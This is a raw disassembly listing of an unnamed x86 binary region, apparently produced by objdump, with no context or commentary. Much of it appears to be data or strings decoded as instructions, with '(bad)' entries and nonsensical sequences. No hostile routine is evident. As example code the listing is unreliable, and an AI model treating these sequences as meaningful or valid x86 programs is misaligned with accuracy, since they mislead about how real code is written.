  42244c:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422454:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  42245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245c:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422462:	adc    eax,0x1a49ba4
  422467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422468:	popf   
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	jno    0x422410
  42246c:	xchg   edi,eax
  42246d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422476:	xor    eax,0x9ba485a4
  42247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247c:	mov    ebx,0xd1e2d3a4
  422481:	in     al,dx
  422482:	xchg   ebp,eax
  422483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422484:	adc    eax,0x3ba49ba4
  422489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248a:	popf   
  42248b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422494:	fwait
  422495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422496:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42249d:	sub    al,0xf7
  42249f:	cs pop ss
  4224a1:	push   cs
  4224a2:	adc    eax,0x3a49108
  4224a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a8:	fwait
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  4224b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b2:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  4224b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ba:	shl    DWORD PTR [edx],cl
  4224bc:	shr    DWORD PTR [ecx+esi*8],1
  4224bf:	or     al,0xf7
  4224c1:	push   cs
  4224c2:	pop    ss
  4224c3:	outs   dx,BYTE PTR ds:[esi]
  4224c4:	adc    eax,0x3a49168
  4224c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ca:	fwait
  4224cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224cc:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  4224d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d4:	xor    eax,0x9ba48da4
  4224d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224da:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  4224e2:	imul   DWORD PTR [esi+0x17]
  4224e5:	dec    esi
  4224e6:	adc    eax,0x37a49148
  4224eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ec:	fwait
  4224ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ee:	jae    0x422494
  4224f0:	popf   
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  4224f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fa:	fwait
  4224fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fc:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  422504:	test   DWORD PTR [esi+0x16],0x91a814ae
  42250b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250c:	aaa    
  42250d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250e:	fwait
  42250f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422510:	jae    0x4224b6
  422512:	popf   
  422513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422514:	pop    ss
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	xchg   ebp,eax
  422517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422518:	push   ecx
  422519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251a:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  422521:	inc    edx
  422522:	ror    DWORD PTR [eax+esi*8-0x54],1
  422526:	imul   BYTE PTR [esi-0x77eb71ea]
  42252c:	xchg   ecx,eax
  42252d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252e:	aaa    
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	fwait
  422531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422532:	jae    0x4224d8
  422534:	popf   
  422535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422536:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  42253d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42253e:	fwait
  42253f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422540:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  422547:	mov    esi,?
  422549:	mov    ss,WORD PTR [esi]
  42254b:	out    dx,al
  42254c:	adc    al,0xe8
  42254e:	xchg   ecx,eax
  42254f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422550:	aaa    
  422551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422552:	fwait
  422553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422554:	jae    0x4224fa
  422556:	popf   
  422557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422558:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  42255f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422560:	fwait
  422561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422562:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42256a:	imul   dh
  42256c:	push   ss
  42256d:	into   
  42256e:	adc    al,0xc8
  422570:	xchg   ecx,eax
  422571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422572:	cmp    eax,0x51a49ba4
  422577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422578:	popf   
  422579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42257a:	jnp    0x422520
  42257c:	xchg   ebx,eax
  42257d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42257e:	fwait
  42257f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422580:	xchg   ecx,eax
  422581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422582:	shl    dl,cl
  422584:	shr    ah,1
  422586:	lock int3 
  422588:	test   dh,0x16
  42258b:	cs adc al,0x28
  42258e:	push   ss
  42258f:	push   cs
  422590:	adc    al,0x8
  422592:	xchg   ebx,eax
  422593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422594:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42259b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42259c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  4225a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a4:	fwait
  4225a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a6:	lea    esp,[edx+edx*8-0xfd32fde]
  4225ad:	or     al,0xf6
  4225af:	push   cs
  4225b0:	push   ss
  4225b1:	outs   dx,BYTE PTR ds:[esi]
  4225b2:	adc    al,0x68
  4225b4:	xchg   ecx,eax
  4225b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225b6:	add    BYTE PTR [eax],al
  4225b8:	inc    eax
  4225b9:	and    al,0x42
  4225bb:	add    BYTE PTR [esi+eiz*1+0x42],cl
  4225bf:	add    BYTE PTR [esi+eiz*1+0x42],dl
  4225c3:	add    ah,bl
  4225c5:	daa    
  4225c6:	inc    edx
  4225c7:	add    BYTE PTR [eax],bh
  4225c9:	and    al,0x42
  4225cb:	add    BYTE PTR [eax+0x26],bl
  4225ce:	inc    edx
  4225cf:	add    BYTE PTR [edx+0x3200427c],bh
  4225d5:	jg     0x422619
  4225d7:	add    BYTE PTR [eax+0x27],cl
  4225da:	inc    edx
  4225db:	add    ah,cl
  4225dd:	daa    
  4225de:	inc    edx
  4225df:	add    BYTE PTR [esi+eiz*1],dh
  4225e2:	inc    edx
  4225e3:	add    BYTE PTR [eax],bh
  4225e5:	es inc edx
  4225e7:	add    al,cl
  4225e9:	daa    
  4225ea:	inc    edx
  4225eb:	add    BYTE PTR [esi+eiz*1-0x34b5ffbe],bl
  4225f2:	push   es
  4225f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f4:	scas   al,BYTE PTR es:[edi]
  4225f5:	or     al,0x6
  4225f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f8:	push   eax
  4225f9:	es inc edx
  4225fb:	add    BYTE PTR [eax],al
  4225fd:	daa    
  4225fe:	inc    edx
  4225ff:	add    BYTE PTR [edi+eiz*1],dl
  422602:	inc    edx
  422603:	add    BYTE PTR [eax],ah
  422605:	daa    
  422606:	inc    edx
  422607:	add    BYTE PTR [eax],dh
  422609:	daa    
  42260a:	inc    edx
  42260b:	add    BYTE PTR [eax+0x3c004226],cl
  422611:	and    al,0x42
  422613:	add    BYTE PTR [eax-0x67ffbdda],ch
  422619:	es inc edx
  42261b:	add    al,ah
  42261d:	daa    
  42261e:	inc    edx
  42261f:	add    BYTE PTR [esi+0x38a4069a],ch
  422625:	inc    ebx
  422626:	out    0xbd,eax
  422628:	mov    eax,0xc0004226
  42262d:	es inc edx
  42262f:	add    BYTE PTR [esi+eiz*1+0x42],bl
  422633:	add    BYTE PTR [edi+eax*4],ah
  422636:	loopne 0x4225f5
  422638:	jbe    0x4226b5
  42263a:	pop    ds
  42263b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42263c:	add    BYTE PTR [eax],al
  42263e:	inc    eax
  42263f:	add    dl,ch
  422641:	rcl    dl,cl
  422643:	pop    ecx
  422644:	das    
  422645:	jg     0x422689
  422647:	add    bl,bl
  422649:	outs   dx,DWORD PTR fs:[esi]
  42264b:	arpl   WORD PTR [edi+0xf],si
  42264e:	pop    ebx
  42264f:	xor    DWORD PTR [esi-0x5],esi
  422652:	(bad)  
  422653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422654:	mov    dl,0xc
  422656:	xchg   ebx,eax
  422657:	test   al,0x44
  422659:	es inc edx
  42265b:	add    BYTE PTR [edx-0x555bf926],ch
  422661:	fiadd  WORD PTR [esi]
  422663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422665:	fiadd  DWORD PTR [esi]
  422667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422668:	mov    ds:0xbea406da,al
  42266d:	fiadd  DWORD PTR [esi]
  42266f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422670:	mov    edx,0xb6a406da
  422675:	fiadd  DWORD PTR [esi]
  422677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422678:	mov    dl,0xda
  42267a:	push   es
  42267b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267c:	mov    ds,edx
  42267e:	push   es
  42267f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422680:	mov    bl,dl
  422682:	push   es
  422683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422684:	out    dx,al
  422685:	fiadd  DWORD PTR [esi]
  422687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422688:	dec    DWORD PTR [ebx]
  42268a:	adc    edi,DWORD PTR [edx]
  42268c:	xor    al,0x24
  42268e:	inc    edx
  42268f:	add    BYTE PTR ds:0x17004229,ah
  422695:	loop   0x422620
  422697:	js     0x422647
  422699:	call   0xa4d7:0xcb3aa406
  4226a0:	and    al,0x75
  4226a2:	add    BYTE PTR [eax],al
  4226a4:	xor    BYTE PTR [edx+eax*2],ah
  4226a7:	add    BYTE PTR [edx],ah
  4226a9:	inc    ebx
  4226aa:	sbb    eax,DWORD PTR [edx+0x0]
	...
  4226b8:	hlt    
  4226b9:	clc    
  4226ba:	sar    BYTE PTR [ebp+0x319340bf],cl
  4226c0:	sub    eax,DWORD PTR [edi+0x1f]
  4226c3:	jle    0x4226c5
	...
  4226e9:	add    BYTE PTR [eax],al
  4226eb:	add    BYTE PTR [edx+0x427c],bh
	...
  4226f9:	add    BYTE PTR [eax],al
  4226fb:	add    cl,bh
  4226fd:	jmp    0xa48f2743
  422702:	push   ecx
  422703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422704:	jg     0x4226aa
  422706:	inc    edi
  422707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422708:	push   ecx
  422709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270a:	inc    ebx
  42270b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270c:	std    
  42270d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270e:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  422715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422716:	push   ebx
  422717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422718:	dec    ecx
  422719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271a:	std    
  42271b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271c:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  422723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422724:	push   ecx
  422725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422726:	jg     0x4226cc
  422728:	std    
  422729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42272a:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  422731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422732:	dec    ebx
  422733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422734:	inc    ebx
  422735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422736:	jne    0x4226dc
  422738:	pop    ecx
  422739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42273a:	jnp    0x4226e0
  42273c:	dec    ecx
  42273d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42273e:	fwait
  42273f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  422748:	xor    eax,eax
  42274a:	xor    esp,DWORD PTR [eax]
  42274c:	xor    eax,DWORD PTR [eax]
  42274e:	xor    esp,DWORD PTR [eax+0x33]
  422751:	inc    eax
  422752:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  422758:	xor    al,al
  42275a:	xor    ah,BYTE PTR [eax]
  42275c:	xor    al,BYTE PTR [eax]
  42275e:	xor    ah,BYTE PTR [eax+0x32]
  422761:	inc    eax
  422762:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422768:	xor    ecx,esp
  42276a:	xor    ecx,esi
  42276c:	xor    ecx,eax
  42276e:	xor    ecx,edx
  422770:	xor    edx,esp
  422772:	xor    edx,esi
  422774:	xor    edx,eax
  422776:	xor    edx,edx
  422778:	xor    ebx,esp
  42277a:	xor    ebx,esi
  42277c:	xor    ebx,eax
  42277e:	xor    ebx,edx
  422780:	xor    eax,esi
  422782:	push   ebx
  422783:	shl    BYTE PTR [ebx-0x40],0x93
  422787:	rcl    DWORD PTR [esi-0x56],0x15
  42278b:	into   
  42278c:	xchg   ebp,eax
  42278d:	dec    ecx
  42278e:	xor    ecx,esp
  422790:	sbb    eax,0x50abaae2
  422795:	push   0x1e
  422797:	cs je  0x4227ae
  42279a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  4227a0:	imul   edi,edx,0xffffffd5
  4227a3:	leave  
  4227a4:	daa    
  4227a5:	dec    eax
  4227a6:	out    dx,eax
  4227a7:	pushf  
  4227a8:	mov    dh,0xdf
  4227aa:	dec    esi
  4227ab:	xchg   ebp,eax
  4227ac:	lock xor DWORD PTR [esi-0x6c],ebp
  4227b0:	inc    ebp
  4227b1:	or     eax,0xc1470876
  4227b6:	js     0x422773
  4227b8:	popa   
  4227b9:	pop    ecx
  4227ba:	jecxz  0x422827
  4227bc:	mov    BYTE PTR [edx-0x56],0x5
  4227c0:	cs enter 0xaa46,0x44
  4227c5:	aas    
  4227c6:	inc    ebp
  4227c7:	leave  
  4227c8:	test   BYTE PTR [ebx+0x819a593],0xd8
  4227cf:	jl     0x422799
  4227d1:	mov    es,WORD PTR [edx+0x0]
  4227d4:	jb     0x422830
  4227d6:	pop    ss
  4227d7:	sub    edi,DWORD PTR [esi+eiz*1]
  4227da:	inc    edx
  4227db:	add    BYTE PTR [eax+0x76004226],ah
  4227e1:	sti    
  4227e2:	fbld   TBYTE PTR [ebp+0x0]
	...
  4227f0:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  4227f6:	popa   
  4227f7:	arpl   WORD PTR [edi+0x7a],bp
  4227fa:	popa   
  4227fb:	outs   dx,DWORD PTR ds:[si]
  4227fd:	gs ins DWORD PTR es:[edi],dx
  4227ff:	jae    0x422843
  422801:	outs   dx,DWORD PTR ds:[esi]
  422802:	ins    BYTE PTR es:[edi],dx
  422803:	gs mov cl,0x65
  422806:	in     eax,dx
  422807:	jg     0x422842
  422809:	ja     0x422874
  42280b:	jp     0x422800
  42280d:	inc    esp
  42280e:	push   0x1b
  422810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422811:	push   ecx
  422812:	dec    esp
  422813:	gs jb  0x42288f
  422816:	popa   
  422817:	push   ebx
  422818:	jne    0x42288b
  42281a:	jae    0x42287d
  42281c:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  422823:	inc    esp
  422824:	(bad)  [edx+0x65]
  422827:	jae    0x42287f
  422829:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  422830:	jb     0x422894
  422832:	gs je  0x422808
  422835:	lds    edx,FWORD PTR [eax-0x68]
  422838:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  42283c:	fs jne 0x4228ae
  42283f:	push   eax
  422840:	gs fs jae 0x4228b1
  422844:	popa   
  422845:	ins    DWORD PTR es:[edi],dx
  422846:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  422859:	add    BYTE PTR [eax],al
  42285b:	add    BYTE PTR [esp+ecx*4],ch
  42285e:	push   ss
  42285f:	mov    esi,0x6f4c8773
  422864:	jb     0x4228d4
  422866:	jno    0x4228d1
  422868:	or     al,0x36
  42286a:	lods   al,BYTE PTR ds:[esi]
  42286b:	repnz push edx
  42286d:	je     0x4228de
  42286f:	je     0x4228b5
  422871:	js     0x42282f
  422873:	cmc    
  422874:	outs   dx,DWORD PTR ds:[esi]
  422875:	ins    DWORD PTR es:[edi],dx
  422876:	popa   
  422877:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42287e:	popa   
  42287f:	jb     0x4228f6
  422881:	push   0x68736f79
  422886:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42288d:	mov    ch,0xa5
  42288f:	jns    0x422904
  422891:	outs   dx,DWORD PTR ds:[esi]
  422892:	addr16 popa 
  422894:	add    BYTE PTR [bp+si],bh
  422897:	sub    bh,cl
  422899:	icebp  
  42289a:	gs ins BYTE PTR es:[edi],dx
  42289c:	jae    0x4228e6
  42289e:	popa   
  42289f:	je     0x422909
  4228a1:	ins    DWORD PTR es:[edi],dx
  4228a2:	add    BYTE PTR gs:[bx+si],al
  4228a6:	in     al,dx
  4228a7:	mov    ecx,0x414ad1d2
  4228ac:	ins    DWORD PTR es:[edi],dx
  4228ad:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  4228b4:	gs ins DWORD PTR es:[edi],dx
  4228b6:	add    BYTE PTR [eax],al
  4228b8:	jne    0x4228ca
  4228ba:	popa   
  4228bb:	or     BYTE PTR [esi+0x73654dbb],al
  4228c1:	popa   
  4228c2:	push   0x78000061
  4228c7:	loope  0x42290b
  4228c9:	stos   BYTE PTR es:[edi],al
  4228ca:	je     0x42292d
  4228cc:	push   edi
  4228cd:	popa   
  4228ce:	jb     0x42293b
  4228d0:	jae    0x42293d
  4228d2:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  4228d9:	loope  0x4228a7
  4228db:	aad    0x6f
  4228dd:	jb     0x42294b
  4228df:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  4228e6:	je     0x4228fb
  4228e8:	adc    al,BYTE PTR [ebp+0x77646172]
  4228ee:	outs   dx,DWORD PTR ds:[esi]
  4228ef:	gs ins DWORD PTR es:[edi],dx
  4228f1:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  4228f8:	outs   dx,BYTE PTR ds:[esi]
  4228f9:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  422900:	ja     0x422966
  422902:	outs   dx,DWORD PTR ds:[esi]
  422903:	popa   
  422904:	outs   dx,BYTE PTR ds:[esi]
  422905:	gs jae 0x42296a
  422908:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  42290f:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  422917:	inc    ebx
  422918:	jb     0x4228d3
  42291a:	sbb    al,0xd9
  42291c:	jo     0x422987
  42291e:	addr16 js 0x422996
  422921:	jo     0x422998
  422923:	fs add ch,cl
  422926:	xchg   esi,eax
  422927:	in     eax,dx
  422928:	jno    0x42299b
  42292a:	iret   
  42292b:	jbe    0x422926
  42292d:	or     dh,BYTE PTR [esi-0x3]
  422930:	cwde   
  422931:	int    0xd6
  422933:	std    
  422934:	pop    ebp
  422935:	fsubr  DWORD PTR [edi]
  422937:	dec    edx
  422938:	xor    eax,0xd6cd860a
  42293d:	stc    
  42293e:	inc    ebx
  42293f:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  422945:	dec    edx
  422946:	sbb    BYTE PTR [ecx+0x52],bh
  422949:	mov    ch,al
  42294b:	jns    0x42299f
  42294d:	dec    edx
  42294e:	sbb    BYTE PTR [ecx+0x6e],bh
  422951:	xchg   edx,eax
  422952:	cmp    eax,0xcd96c5cb
  422957:	in     eax,dx
  422958:	jno    0x4229cb
  42295a:	iret   
  42295b:	jbe    0x422956
  42295d:	or     dh,BYTE PTR [esi-0x3]
  422960:	int    0x96
  422962:	std    
  422963:	pop    ebp
  422964:	jns    0x4229b1
  422966:	pop    edx
  422967:	xor    eax,0x96cd920a
  42296c:	stc    
  42296d:	inc    ebx
  42296e:	icebp  
  42296f:	(bad)  
  422970:	das    
  422971:	int    0x76
  422973:	mov    BYTE PTR [ecx+0x6e],bh
  422976:	mov    DWORD PTR [edx-0x13749387],esi
  42297c:	jns    0x4229ec
  42297e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422984:	retf   
  422985:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42298c:	jno    0x42295d
  42298e:	jbe    0x422989
  422990:	or     dh,BYTE PTR [esi-0x3]
  422993:	int    0x96
  422995:	std    
  422996:	pop    ebp
  422997:	fdiv   DWORD PTR [ebx-0x6df55465]
  42299d:	int    0x96
  42299f:	stc    
  4229a0:	inc    ebx
  4229a1:	icebp  
  4229a2:	(bad)  
  4229a3:	test   BYTE PTR [ecx+0x6e],bh
  4229a6:	mov    ebp,esp
  4229a8:	int    0x76
  4229aa:	mov    BYTE PTR [ecx+0x6e],bh
  4229ad:	add    DWORD PTR [edi+0x79],0xcbd2896c
  4229b4:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  4229bb:	jno    0x42298c
  4229bd:	jbe    0x4229b8
  4229bf:	or     dh,BYTE PTR [esi-0x3]
  4229c2:	cwde   
  4229c3:	int    0xd6
  4229c5:	std    
  4229c6:	pop    ebp
  4229c7:	ret    0x2be4
  4229ca:	cmp    DWORD PTR [edx],ecx
  4229cc:	xchg   ch,cl
  4229ce:	(bad)  
  4229cf:	stc    
  4229d0:	inc    ebx
  4229d1:	adc    DWORD PTR [eax+0x52794ad6],ebp
  4229d7:	test   BYTE PTR [ebx-0x78913648],ch
  4229dd:	ret    0x79ab
  4229e0:	xchg   edx,eax
  4229e1:	aad    0xcb
  4229e3:	lds    edx,FWORD PTR [esi+0x7171edcd]
  4229e9:	iret   
  4229ea:	jbe    0x4229e5
  4229ec:	or     dh,BYTE PTR [esi-0x3]
  4229ef:	int    0x96
  4229f1:	std    
  4229f2:	pop    ebp
  4229f3:	pop    ecx
  4229f4:	ins    BYTE PTR es:[edi],dx
  4229f5:	cmp    dh,BYTE PTR ds:0x96cd920a
  4229fb:	stc    
  4229fc:	inc    ebx
  4229fd:	icebp  
  4229fe:	(bad)  
  4229ff:	push   ebx
  422a00:	int    0x76
  422a02:	mov    BYTE PTR [ecx+0x6e],bh
  422a05:	mov    BYTE PTR [edi+0x47816c79],ah
  422a0b:	jns    0x422a7b
  422a0d:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  422a13:	call   0xcded:0xcd965b98
  422a1a:	jbe    0x422a50
  422a1c:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  422a23:	sbb    al,0x81
  422a25:	(bad)  
  422a26:	and    al,0x98
  422a28:	int    0xd6
  422a2a:	adc    al,0x47
  422a2c:	mov    ds:0xff8eca62,al
  422a31:	add    al,0x7d
  422a33:	add    ch,dl
  422a35:	lods   eax,DWORD PTR ds:[esi]
  422a36:	clc    
  422a37:	icebp  
  422a38:	jo     0x422a04
  422a3a:	(bad)  
  422a3c:	jge    0x422a3e
  422a3e:	aad    0xad
  422a40:	clc    
  422a41:	icebp  
  422a42:	jo     0x4229d6
  422a44:	adc    ecx,ebp
  422a46:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  422a4d:	jo     0x422abf
  422a4f:	jo     0x422ac1
  422a51:	jo     0x4229ed
  422a53:	xor    esi,edi
  422a55:	cwde   
  422a56:	add    al,0xc
  422a58:	add    BYTE PTR [ebp-0x80],bl
  422a5b:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a61:	or     DWORD PTR [eax-0x75],ebx
  422a64:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a6b:	jecxz  0x422a58
  422a6d:	hlt    
  422a6e:	scas   eax,DWORD PTR es:[edi]
  422a6f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a76:	sub    dl,0xfa
  422a79:	iret   
  422a7a:	pop    eax
  422a7b:	iret   
  422a7c:	push   0xffffffcd
  422a7e:	out    0xfd,al
  422a80:	int    0x76
  422a82:	adc    DWORD PTR [ebx],esi
  422a84:	out    0x34,al
  422a86:	sub    ecx,ecx
  422a88:	or     dh,BYTE PTR [esi-0x43]
  422a8b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a91:	sub    BYTE PTR [edi],0x6
  422a94:	sub    DWORD PTR [eax-0x72357f80],eax
  422a9a:	cmc    
  422a9b:	sub    esp,esi
  422a9d:	in     eax,dx
  422a9e:	aad    0xe9
  422aa0:	add    ebx,ebp
  422aa2:	mov    bh,dh
  422aa4:	fcmovnbe st,st(5)
  422aa6:	out    dx,eax
  422aa7:	pushf  
  422aa8:	xchg   edi,edi
  422aaa:	test   al,0xcf
  422aac:	fs adc ebx,0xffffffe9
  422ab0:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422ab4:	iret   
  422ab5:	int3   
  422ab6:	call   0x80c2797f
  422abb:	jno    0x422a55
  422abd:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422ac7:	int    0xe6
  422ac9:	std    
  422aca:	xor    esp,esi
  422acc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422acd:	das    
  422ace:	pop    ecx
  422acf:	push   0xffffffcd
  422ad1:	(bad)  
  422ad2:	or     eax,0xfcde9e3
  422ad7:	sub    edi,eax
  422ad9:	xchg   DWORD PTR [edi],ecx
  422adb:	iret   
  422adc:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422ae2:	add    BYTE PTR [eax-0x102c8233],0x88
  422ae9:	add    al,0xf2
  422aeb:	add    DWORD PTR [ebx+0x2],0x80818069
  422af2:	adc    dh,0x4e
  422af5:	inc    ebx
  422af6:	jns    0x422a7a
  422af8:	fldlg2 
  422afa:	es int 0xc6
  422afd:	or     eax,0x809221bd
  422b02:	add    al,0x81
  422b05:	mov    al,ds:0xfb87d287
  422b0a:	add    al,0xbd
  422b0c:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422b13:	jns    0x422ae2
  422b15:	ins    DWORD PTR es:[edi],dx
  422b16:	and    ch,0xa0
  422b19:	push   edx
  422b1a:	add    al,0x3
  422b1c:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422b22:	push   edx
  422b23:	add    al,0x3
  422b25:	push   ebx
  422b26:	mov    al,cl
  422b28:	test   bh,bh
  422b2a:	retf   
  422b2b:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422b33:	(bad)  
  422b34:	in     al,dx
  422b35:	outs   dx,DWORD PTR ds:[esi]
  422b36:	rcl    bl,1
